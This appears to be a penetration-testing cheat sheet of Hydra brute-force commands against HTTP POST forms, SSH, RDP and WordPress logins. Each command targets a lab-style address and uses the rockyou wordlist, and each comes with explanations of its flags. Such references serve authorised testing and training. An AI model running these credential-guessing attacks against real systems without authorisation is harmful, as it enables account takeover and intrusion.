# Hydra Commands
Commands for password brute-forcing with Hydra

## HTTP POST Form Brute-Force
```bash copy
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/Account/login.aspx:__VIEWSTATE=95ZYxDxm74Lhbyjee8Ulme9lLXAd23uuk0PUc3Y%2F1XW4TJeGT7bdvAOuUJTIfe4ASHM8vAty8uMzn82A3zafq9%2F4iThU%2FC7j3MJS4kmVmKbiZsAVEsVzGr6t2AZBcG2rlfwjITTOcEUFFZBazJrYSxd5NcP%2BufiViloNW2NWn8TIfbk3Wrh2Fzj8yvyWI90drIvOArxgTQRl3rHTMdvX16M9MS83LHc6G9fd0O9QP%2FIHbwfshNWGAesZoVfOts0Ox3TJ8v3wSkxQqIYuE0bS0IB5HNoG%2FtuQ7yB3IpqxS0v68fRXlTV1UABIIcbrJHBFvkCeivvGy0XIWbxIoVV5C1P1kHVDJA28Hegat%2BwAJAULuzcy&__EVENTVALIDATION=DIJsYDDgicMtOPNaf4sO3hbIKJijnqdUhoSfihJVt%2BdxEZPZv3uqSWjiRAJOe5DNV3PIGseovVJFJ4%2F1MlzxIiGZ93ztZC0%2BUjF5xI4cVFNkwR2wXaKxR7H3a7RO0o5xqIUQx%2FSRcaKwWGL80aGyuMsGM4fLwIGvt77JBt50siwtrRqG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -V -I
```
- Brute-forces an HTTP POST login form with a specific username and wordlist.
- `-l admin`: Specifies the username `admin`.
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the password wordlist.
- `http-post-form`: Specifies the protocol.
- `/Account/login.aspx:...`: Defines the login form parameters and failure message.
- `-V`: Enables verbose mode.
- `-I`: Ignores restored sessions.

## Generic Protocol Brute-Force
```bash copy
hydra -P /usr/share/wordlists/rockyou.txt -v 10.10.10.10 ssh
```
- Brute-forces passwords for a specified protocol (e.g., SSH).
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the password wordlist.
- `-v`: Enables verbose mode.
- `ssh`: Specifies the protocol.

## Username and Password Brute-Force
```bash copy
hydra -v -V -u -L usernames.txt -P /usr/share/wordlists/rockyou.txt -t 1 -u 10.10.10.10 ssh
```
- Brute-forces both usernames and passwords for a protocol.
- `-v`: Enables verbose mode.
- `-V`: Shows login attempts.
- `-u`: Loops through usernames first.
- `-L usernames.txt`: Specifies the username list.
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the password wordlist.
- `-t 1`: Uses one thread.
- `ssh`: Specifies the protocol.

## RDP Brute-Force
```bash copy
hydra -t 1 -V -f -l admin -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
```
- Brute-forces Windows Remote Desktop with a password list.
- `-t 1`: Uses one thread.
- `-V`: Shows login attempts.
- `-f`: Stops on first successful login.
- `-l admin`: Specifies the username `admin`.
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the password wordlist.
- `rdp://10.10.10.10`: Specifies the RDP protocol and target.

## WordPress Login Brute-Force
```bash copy
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
- Brute-forces a WordPress login form with specific parameters.
- `-l admin`: Specifies the username `admin`.
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the password wordlist.
- `-V`: Shows login attempts.
- `http-form-post`: Specifies the protocol.
- `/wp-login.php:...`: Defines the login form parameters and success condition.

## SSH Brute-Force
```bash copy
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -V -I -F -t 64
```
- Brute-forces SSH login with a specific username and high thread count.
- `-l jan`: Specifies the username `jan`.
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the password wordlist.
- `-V`: Shows login attempts.
- `-I`: Ignores restored sessions.
- `-F`: Stops on first successful login.
- `-t 64`: Uses 64 threads.
- `ssh`: Specifies the protocol.